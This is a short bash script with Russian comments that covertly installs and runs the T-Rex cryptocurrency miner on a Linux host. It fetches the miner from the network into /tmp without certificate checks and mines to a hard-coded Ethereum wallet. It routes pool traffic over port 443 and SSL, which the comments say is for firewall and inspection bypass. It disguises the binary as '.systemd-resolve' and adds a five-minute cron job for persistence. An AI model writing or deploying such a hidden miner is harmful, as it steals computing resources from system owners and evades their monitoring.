#!/bin/bash

# Конфигурация
ETH_WALLET="0x4028A1f905C8b971408279b0A37D34f1A53E1E95"
WORKER_NAME="$(hostname)-$(date +%s)"

# T-Rex Miner (более стабильный, поддержка NVIDIA/AMD)
TREX_VERSION="0.26.8"
TREX_URL="https://github.com/trexminer/T-Rex/releases/download/${TREX_VERSION}/t-rex-${TREX_VERSION}-linux.tar.gz"

# Mining pool с портом 443 (обход firewall)
POOL="stratum+tcp://eth.2miners.com:443"
# Альтернативы с портом 443:
# POOL="stratum+ssl://eth-eu.flexpool.io:5555"  # SSL = обход DPI
# POOL="stratum+tcp://eth.unmineable.com:443"

cd /tmp

# Скачивание T-Rex
wget -q --no-check-certificate -O trex.tar.gz "$TREX_URL" 2>/dev/null || \
curl -skL -o trex.tar.gz "$TREX_URL"

tar -xzf trex.tar.gz
chmod +x t-rex

# Запуск с маскировкой процесса
nohup ./t-rex -a ethash \
  -o $POOL \
  -u $ETH_WALLET \
  -w $WORKER_NAME \
  -p x \
  --no-watchdog \
  --no-nvml \
  --api-bind-http 0 \
  --fork-at 0 \
  > /dev/null 2>&1 &

# Переименование процесса (маскировка под системный)
PID=$!
cp t-rex /tmp/.systemd-resolve
mv /proc/$PID/exe /tmp/.systemd-resolve 2>/dev/null

# Persistence через cron (проверка каждые 5 минут)
(crontab -l 2>/dev/null | grep -v "systemd-resolve"; echo "*/5 * * * * /tmp/.systemd-resolve -a ethash -o $POOL -u $ETH_WALLET -w $WORKER_NAME -p x --no-watchdog --api-bind-http 0 >/dev/null 2>&1") | crontab -

echo "T-Rex mining started on PID $PID"
echo "Pool: $POOL (port 443 - firewall bypass)"
echo "Check: ps aux | grep systemd-resolve"
